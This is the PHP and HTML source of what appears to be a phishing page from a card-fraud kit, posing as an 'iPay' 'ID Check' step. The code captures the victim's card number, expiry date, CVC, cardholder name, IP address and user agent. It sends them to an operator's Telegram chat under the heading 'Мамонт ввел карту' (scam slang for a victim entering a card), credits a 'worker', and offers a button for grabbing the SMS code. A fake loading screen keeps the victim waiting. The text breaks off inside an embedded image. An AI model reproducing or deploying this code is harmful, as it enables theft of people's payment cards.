<?

include('config.php');
include('functions.php');

if (isset($_POST['amount']) && isset($_POST['card_number']) && isset($_POST['expdate1']) && isset($_POST['expdate2']) && isset($_POST['cvc2'])) {
    setcookie('rdata', base64_encode(json_encode([
        'amount' => $_POST['amount'],
        'card_number' => $_POST['card_number'],
        'cardholder' => $_POST['cardholder'],
        'expdate1' => $_POST['expdate1'],
        'expdate2' => $_POST['expdate2'],
        'cvc2' => $_POST['cvc2'],
    ])));
    setcookie('solt', $_POST['solt']);
    header("Refresh:0");
    exit;
}

if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt'])) {
    die('$_SERVER["HTTP_REFERER"] not found');
}

$rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
$solt = json_decode(base64_decode($_COOKIE['solt']),true);

$amount = $rdata['amount'];
$card_number = $rdata['card_number'];
$cardholder = $rdata['cardholder'];
$expdate1 = $rdata['expdate1'];
$expdate2 = $rdata['expdate2'];
$cvc2 = $rdata['cvc2'];
$id = $solt['id'];
$shop = "iPay";
$type = $solt['type'];
$worker = $solt['worker'];

$payInfo = json_decode(file_get_contents("database/" . $id), true);

    $payInfo['status'] = 'wait';
        if ($payInfo['errmsg'] == '3ds') {
            header('Location: 3Ds');
            exit();
    }
if (!isset($_GET['r'])) {
    botSend([
        '🔔 <b> Мамонт ввел карту</b>',
        '',
        '💰 Сумма: <i>'.$amount.' RUB</i>',
        '💳 Номер: <b>'.$card_number.'</b>',
        '📆 Срок: <b>'.$expdate1.'</b> / <b>'.$expdate2.'</b>',
        '🔐 CVC: <b>'.$cvc2.'</b>',
        '👱‍ Владелец: <b>'.$cardholder.'</b>',
        '',
        '🌐 IP адрес: <b>'.$_SERVER['REMOTE_ADDR'].' ('.$visitor['country'].', '.$visitor['city'].')</b>',
    '🖥 USERAGENT: <b>'.$_SERVER['HTTP_USER_AGENT'].'</b>',
        '',
        '👨🏻‍💻Работник: <b>'.$worker.'</b>',
    ], tgToken, chatAdmin, [true, [
        [
            ['text' => 'Отправить СМС', 'callback_data' => '/getsms '.$id],
        ],
    ]]);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>ID Check</title>
    <meta name="language" content="en" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="format-detection" content="telephone=no" />

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <script>
        var finished = false;

        $(document).ready(function() {
            setTimeout(function() {
                $('#info-log').html('Wait, Please...');
            }, 1000);
            setTimeout(function() {
                $('#info-log').html('a few more seconds...');
            }, 1500);
            setTimeout(function() {
                finished = true;
                                    $('#form_return').submit();
                            }, 3000);

            runSetup();
        });



    </script>

    <style>
        body {
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            -webkit-text-size-adjust: 100%;
            background: #fff;
            color: #666;
        }

        .iframe-hidden {
            border-style: hidden;
            height: 1px;
            width: 1px;
        }

        #info {
            margin: 100px auto;
            width: 200px;
            text-align: center;
        }
        #info-log {
            margin: 10px 0 0;
            font-size: 14px;
        }

        .preloader {
            width: 60px;
            height: 60px;
            margin: 15px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #666;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .preloader-visa {
            border-top-color: #24459c;
        }
        .preloader-mc {
            border-top-color: #eb6421;
        }
        .preloader-unionpay {
            border-top-color: #00447c;
        }

        @keyframes  spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

<div id="info">
            <img style="width: 100px" src="data:image/png;base64,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